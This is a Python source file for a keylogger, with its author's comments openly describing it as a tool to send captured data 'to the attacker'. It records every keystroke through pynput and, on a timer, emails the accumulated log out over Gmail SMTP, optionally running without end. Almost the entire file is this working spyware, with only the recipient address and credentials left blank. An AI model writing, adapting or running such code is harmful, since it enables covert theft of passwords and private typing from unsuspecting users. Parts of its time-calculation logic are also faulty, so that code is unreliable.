#! usr/bin/env python3

"""
* Author:               Job Jacob
* Created:              20 December 2020 
* Filename:             keylogger.py
* Example Run (Linux):  python3 keylogger.py
"""

import smtplib
import pynput
import datetime
import time
from threading import Thread

""" 
* Function Name:  get_current_time()
* Input:          None
* Output:         current_time (list): Current time in list format: [hour, minute, day, month, year].
* Logic:          The function returns the currrent time as a list of integers.
* Example Call:   current_time = get_current_time()
"""
def get_current_time():
    t = time.localtime()
    current_time = [int(i) for i in time.strftime("%H %M %d %m %Y", t).split(" ")]
    return current_time

""" 
* Function Name:  check_leap_year()
* Input:          year (integer): The year to check leap year.
* Output:         1 if the given year is a leap year else 0
* Logic:          The function checks whether the given year is a leap year or not.
* Example Call:   leap_year = check_leap_year(2020)
"""
def check_leap_year(year):
    if(year % 4) == 0:
        if(year % 100) == 0:
            if(year % 400) == 0:
                return 1
            else:
                return 0
        else:
            return 1
    else:
        return 0

""" 
* Function Name:  calculate_end_time()
* Input:          start_time (list): The time at which the keylogger began execution.
*                 duration (integer): The duration (in hours) for which the keylogger should run. None if the keylogger should run indefinitely.
* Output:         end_time (list): The time at which the keylogger should stop execution. None if the keylogger should run indefinitely.
* Logic:          The function finds the time at which the keylogger should stop execution using the start time and duration of execution.
* Example Call:   end_time = calculate_end_time([2, 20, 21, 12, 2020], 24)
"""
def calculate_end_time(start_time, duration):
    month_days = [31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31]

    if(duration != None):
        end_time = start_time

        leap_year = check_leap_year(end_time[4])
        if(leap_year):
            month_days[1] = 29

        if((duration/24) == 0):
            end_time[0] = start_time[0] + duration
        else:
            end_time[0] = start_time[0] + (duration%24)
            days = int(duration / 24)
            days_ahead = start_time[2] + days

            while(days_ahead > month_days[end_time[3]-1]):
                days_ahead -= month_days[start_time[3]-1] 
                end_time[3] += 1

                if(end_time[3] > 12):
                    end_time[3] = end_time[3] % 12
                    end_time[4] += 1

                    leap_year = check_leap_year(end_time[4])
                    if(leap_year):
                        month_days[1] = 29
                    else:
                        month_days[1] = 28

            end_time[2] = days_ahead
        
        return end_time

    else:
        return None

""" 
* Function Name:  logger()
* Input:          key (key object): The key that was pressed.
* Output:         None
* Logic:          Loop back function that runs when a key is pressed. Appends the keys pressed to a string variable.
* Example Call:   logger(key)
"""
def logger(key):
    global end_time

    if(end_time != None): scheduled_end_time = datetime.datetime(*end_time[4:1:-1], end_time[0], end_time[1])
    current_time = get_current_time()
    current_time = datetime.datetime(*current_time[4:1:-1], current_time[0], current_time[1])

    def log_keystrokes(key):
        global log

        try:
            log += str(key.char)

        except AttributeError:
            if(key == key.space):
                log += " "
            else:
                log += (" " + str(key) + " ")

    if(end_time != None):
        if(current_time < scheduled_end_time):
            log_keystrokes(key)

    else:
        log_keystrokes(key)

""" 
* Function Name:  key_listener()
* Input:          None
* Output:         None
* Logic:          Function that listens for key strokes and calls the log function if key stroke detected. 
* Example Call:   key_listener()
"""
def key_listener():
    keyboard_listener = pynput.keyboard.Listener(on_press=logger)
    
    with keyboard_listener:
        keyboard_listener.join()

""" 
* Function Name:  send_mail()
* Input:          email (string): Email from which the report should be sent to the attacker.
*                 password (string): Password of the email id.
*                 report (string): Report that should be sent to the attacker.
*                 report_email (string): Email id of the attacker to which the data should be sent.
* Output:         None
* Logic:          The function sents the outstanding logs to the attacker by email.
* Example Call:   send_mail("attacker@gmail.com", "123456", "LOGS: .....", "attacker@gmail.com")
"""
def send_mail(email, password, report, report_email):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, report_email, report)
    server.quit()

""" 
* Function Name:  report()
* Input:          report_email (string): Email id of the attacker to which the data should be sent.
*                 interval (integer): The interval (in seconds) in which the outstanding logs should be sent to the attacker.
*                 start_time (list): The time at which the keylogger began execution.
*                 end_time (list): The time at which the keylogger should stop execution. None if the keylogger should run indefinitely.
*                 email (string): Email from which the report should be sent to the attacker.
*                 password (string): Password of the email id.          
* Output:         None
* Logic:          The function formats the report and passes the report to be sent to the attacker at regular intervals of time.
* Example Call:   report("attacker@gmail.com", "600", [2, 20, 21, 12, 2020], [2, 20, 22, 12, 2020], "attacker@gmail.com", "123456")
"""
def report(report_email, interval, start_time, end_time, email, password):
    def format_time(time_list):
        copied_time = time_list.copy()
        
        for i in range(0, len(copied_time)-1):
            copied_time[i] = str(copied_time[i])

            if(len(copied_time[i]) == 1):
                copied_time[i] = "0" + copied_time[i]          

        return copied_time

    template = "LOG REPORT\n\n"
    template += "Start Time: {}:{}, {}/{}/{}\n".format(*format_time(start_time))
    template += "End Time: {}:{}, {}/{}/{}\n\n".format(*format_time(end_time))

    if(end_time != None): scheduled_end_time = datetime.datetime(*end_time[4:1:-1], end_time[0], end_time[1])
    current_time = get_current_time()
    current_time = datetime.datetime(*current_time[4:1:-1], current_time[0], current_time[1])
    
    def format_report(interval, template, report_email, email, password):
        global log

        intvl_st = get_current_time()
        time.sleep(interval)
        intvl_et = get_current_time()

        report = template + "Log interval: {}:{}, {}/{}/{} to {}:{}, {}/{}/{} \n\n".format(*format_time(intvl_st), *format_time(intvl_et))
        
        if(log != ""):
            report += "LOGS:\n"
            report += log

        else:
            report += "NO LOGS DURING THIS INTERVAL."

        log = ""

        send_mail(email, password, report, report_email)

    if(end_time != None):
        while(current_time < scheduled_end_time):
            format_report(interval, template, report_email, email, password)

            current_time = get_current_time()
            current_time = datetime.datetime(*current_time[4:1:-1], current_time[0], current_time[1])
        
    else:
        while True:
            format_report(interval, template, report_email, email, password)


if __name__ == "__main__":
    REPORT_EMAIL = ""                       # enter the email id to which the log data should be sent
    INTERVAL = 300                          # the interval (in seconds) in which the log data has to be sent by mail
    DURATION = 1                            # The total duration (in hours) for which the keylogger should run. None if the keylogger should run indefinitely.

    EMAIL = ""                              # enter the email from which the report should be sent to the attacker
    PASSWORD = ""                           # enter the password of the email id

    log = ""

    start_time = get_current_time()
    end_time = calculate_end_time(start_time, DURATION)

    logging_thread = Thread(target=key_listener)
    reporting_thread = Thread(target=report, args=(REPORT_EMAIL, INTERVAL, start_time, end_time, EMAIL, PASSWORD,))
    
    logging_thread.start()
    reporting_thread.start()    


